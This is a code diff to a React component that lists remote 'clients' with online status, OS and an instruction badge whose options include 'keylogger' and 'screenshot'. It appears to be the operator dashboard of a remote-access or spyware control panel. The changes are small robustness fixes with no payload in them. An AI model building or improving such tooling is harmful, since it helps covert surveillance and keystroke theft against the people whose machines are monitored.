@@ -15,7 +15,7 @@ interface Client {
   lastSeen?: string;
   lastActivity?: string;
   instruction: string;
-  system: string; // Required by this component
+  system: string;
   [key: string]: any; // Allow for additional properties
 }
 
@@ -29,7 +29,7 @@ interface ClientsListProps {
 export function ClientsList({ clients, isLoading, onClientClick, onRefresh }: ClientsListProps) {
   // Function to get the appropriate badge variant based on client instruction
   const getInstructionBadge = (instruction: string) => {
-    switch (instruction.toLowerCase()) {
+    switch (instruction?.toLowerCase()) {
       case "keylogger":
         return <Badge variant="outline" className="bg-blue-100 text-blue-800 dark:bg-blue-900 dark:text-blue-200">Keylogger</Badge>;
       case "screenshot":
@@ -51,10 +51,15 @@ export function ClientsList({ clients, isLoading, onClientClick, onRefresh }: Cl
     const lastActivityTime = client.lastActivity || client.lastSeen;
     if (!lastActivityTime) return false;
     
-    const lastActive = new Date(lastActivityTime);
-    const now = new Date();
-    // Consider active if activity was within the last 30 minutes
-    return (now.getTime() - lastActive.getTime()) < 30 * 60 * 1000;
+    try {
+      const lastActive = new Date(lastActivityTime);
+      const now = new Date();
+      // Consider active if activity was within the last 30 minutes
+      return (now.getTime() - lastActive.getTime()) < 30 * 60 * 1000;
+    } catch (e) {
+      console.error("Error parsing last activity date:", e);
+      return false;
+    }
   };
 
   if (isLoading) {
@@ -141,9 +146,9 @@ export function ClientsList({ clients, isLoading, onClientClick, onRefresh }: Cl
               {clients.map((client) => (
                 <TableRow key={client.id} className="hover:bg-accent/50 cursor-pointer" onClick={() => onClientClick(client.id)}>
                   <TableCell className="font-medium">
-                    {client.name} {client.system && `(${client.system})`}
+                    {client.name}
                   </TableCell>
-                  <TableCell>{client.os || "Okänd"}</TableCell>
+                  <TableCell>{client.os || client.system || "Okänd"}</TableCell>
                   <TableCell>
                     <Badge variant={isClientActive(client) ? "success" : "destructive"}>
                       {isClientActive(client) ? "Online" : "Offline"}
